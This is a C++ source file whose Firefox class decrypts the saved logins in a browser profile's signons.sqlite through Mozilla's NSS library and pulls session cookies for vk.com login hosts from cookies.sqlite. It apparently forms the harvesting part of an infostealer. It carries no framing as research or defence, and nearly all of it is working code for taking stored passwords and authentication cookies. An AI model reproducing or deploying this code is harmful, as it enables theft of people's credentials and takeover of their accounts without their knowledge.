#include "data_extractor.h"
#include "mozilla_defs.h"
#include "sqlite/sqlite3.h"
#include "utils.h"
#include <Windows.h>
#include <Wincrypt.h>
#include <tlhelp32.h>

#include <iostream>


std::list< std::vector< std::wstring > > Firefox::GetPasswords()
{
    std::list< std::vector< std::wstring > > result;

    if (!Firefox::is_init)
        Firefox::Init();

    // BUILD PATH
    std::wstring profile_path = Firefox::GetProfilePath();
    if (profile_path.length() == 0)
        return result;

    std::wstring database_path = profile_path;
    database_path += L"signons.sqlite";

    // OPEN DATABASE
    sqlite3* database;
    sqlite3_stmt* stmt;
    std::string path = utf8_encode(database_path);
    int res = sqlite3_open(path.c_str(), &database);
    if (res)
        return result;

    SECStatus status = NSS_Init(utf8_encode(profile_path).c_str());
    if (status != SECSuccess)
        return result;

    // SELECT QUERY
    res = sqlite3_prepare_v2(database, "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins", -1, &stmt, NULL);
    PK11SlotInfo* slot = PK11_GetInternalKeySlot();
    status = PK11_Authenticate(slot, TRUE, NULL);

    if (status != SECSuccess)
        return result;

    while (true)
    {
        res = sqlite3_step(stmt);
        if(res == SQLITE_ROW)
        {
            std::string c_username((const char*)sqlite3_column_text(stmt, 1));
            std::string c_password((const char*)sqlite3_column_text(stmt, 2));

            SECItem *data, *output;

            data = SECITEM_AllocItem(NULL, NULL, 0);
            NSSBase64_DecodeBuffer(NULL, data, c_username.c_str(), c_username.length());
            output = SECITEM_AllocItem(NULL, NULL, 0);
            status = PK11SDR_Decrypt(data, output, NULL);
            if (status != SECSuccess)
                continue;

            std::wstring username = utf8_decode(std::string((const char*)output->data, (size_t)output->len));
            SECITEM_FreeItem(data, TRUE);
            SECITEM_FreeItem(output, TRUE);

            data = SECITEM_AllocItem(NULL, NULL, 0);
            NSSBase64_DecodeBuffer(NULL, data, c_password.c_str(), c_password.length());
            output = SECITEM_AllocItem(NULL, NULL, 0);
            status = PK11SDR_Decrypt(data, output, NULL);
            if (status != SECSuccess)
                continue;

            std::wstring password = utf8_decode(std::string((const char*)output->data, (size_t)output->len));
            SECITEM_FreeItem(data, TRUE);
            SECITEM_FreeItem(output, TRUE);


            std::string c_host((const char*)sqlite3_column_text(stmt, 0));
            std::wstring host = utf8_decode(c_host);


            if (username.length() > 0 || password.length() > 0)
            {
                std::vector<std::wstring> row;
                row.push_back(host);
                row.push_back(username);
                row.push_back(password);
                result.push_back(row);
            }
        }
        else if(res == SQLITE_DONE)
        {
            break;
        }
        else
        {
            break;
        }
    }

    PK11_FreeSlot(slot);
    return result;
}

std::list< std::vector< std::wstring > > Firefox::GetCookies()
{
    std::list< std::vector< std::wstring > > result;

    if (!Firefox::is_init)
        Firefox::Init();

    // BUILD PATH
    std::wstring profile_path = Firefox::GetProfilePath();
    if (profile_path.length() == 0)
        return result;

    std::wstring database_path = profile_path;
    database_path += L"cookies.sqlite";

    // OPEN DATABASE
    sqlite3* database;
    sqlite3_stmt* stmt;
    std::string path = utf8_encode(database_path);
    int res = sqlite3_open(path.c_str(), &database);
    if (res)
        return result;

    // SELECT QUERY
    std::string request = "SELECT host, name, value FROM moz_cookies";
    if (HOSTS_COUNT > 0)
    {
        request += " WHERE ";
        for (int i = 0; i < HOSTS_COUNT; i++)
        {
            request += "host='";
            request += hosts_list[i];
            request += "' OR ";
        }

        request.erase(request.length() - 3);
    }

    res = sqlite3_prepare_v2(database, request.c_str(), -1, &stmt, NULL);

    while (true)
    {
        res = sqlite3_step(stmt);
        if(res == SQLITE_ROW)
        {
            std::string c_host((const char*)sqlite3_column_text(stmt, 0));
            std::wstring host = utf8_decode(c_host);

            std::string c_name((const char*)sqlite3_column_text(stmt, 1));
            std::wstring name = utf8_decode(c_name);

            std::string c_value((const char*)sqlite3_column_text(stmt, 2));
            std::wstring value = utf8_decode(c_value);

            std::vector<std::wstring> row;
            row.push_back(host);
            row.push_back(name);
            row.push_back(value);
            result.push_back(row);
        }
        else if(res == SQLITE_DONE)
        {
            break;
        }
        else
        {
            break;
        }
    }

    sqlite3_close(database);
    return result;
}

void Firefox::Init()
{
    HMODULE handle;
    handle = LoadLibrary(L"D:\\projects\\pcc300\\c\\program files\\Mozilla Firefox\\mozglue.dll");
    handle = LoadLibrary(L"D:\\projects\\pcc300\\c\\program files\\Mozilla Firefox\\nss3.dll");

    NSS_Init = (_NSS_Init)GetProcAddress(handle, "NSS_Init");
    NSS_Shutdown = (_NSS_Shutdown)GetProcAddress(handle, "NSS_Shutdown");
    PK11_GetInternalKeySlot = (_PK11_GetInternalKeySlot)GetProcAddress(handle, "PK11_GetInternalKeySlot");
    PK11_FreeSlot = (_PK11_FreeSlot)GetProcAddress(handle, "PK11_FreeSlot");
    PK11_Authenticate = (_PK11_Authenticate)GetProcAddress(handle, "PK11_Authenticate");
    PK11SDR_Decrypt = (_PK11SDR_Decrypt)GetProcAddress(handle, "PK11SDR_Decrypt");
    NSSBase64_DecodeBuffer = (_NSSBase64_DecodeBuffer)GetProcAddress(handle, "NSSBase64_DecodeBuffer");
    SECITEM_AllocItem = (_SECITEM_AllocItem)GetProcAddress(handle, "SECITEM_AllocItem");
    SECITEM_FreeItem = (_SECITEM_FreeItem)GetProcAddress(handle, "SECITEM_FreeItem");

    Firefox::is_init = true;
}

std::wstring Firefox::GetProfilePath()
{
    return L"D:\\projects\\pcc300\\c\\users\\user\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\704r0ypm.default\\";
}


const char* hosts_list[] = {
    ".vk.com",
    ".login.vk.com",
};

bool Firefox::is_init = false;

_NSS_Init NSS_Init = 0;
_NSS_Shutdown NSS_Shutdown = 0;
_PK11_GetInternalKeySlot PK11_GetInternalKeySlot = 0;
_PK11_FreeSlot PK11_FreeSlot = 0;
_PK11_CheckUserPassword PK11_CheckUserPassword = 0;
_PK11_Authenticate PK11_Authenticate = 0;
_PK11SDR_Decrypt PK11SDR_Decrypt = 0;
_NSSBase64_DecodeBuffer NSSBase64_DecodeBuffer = 0;
_SECITEM_AllocItem SECITEM_AllocItem = 0;
_SECITEM_FreeItem SECITEM_FreeItem = 0;
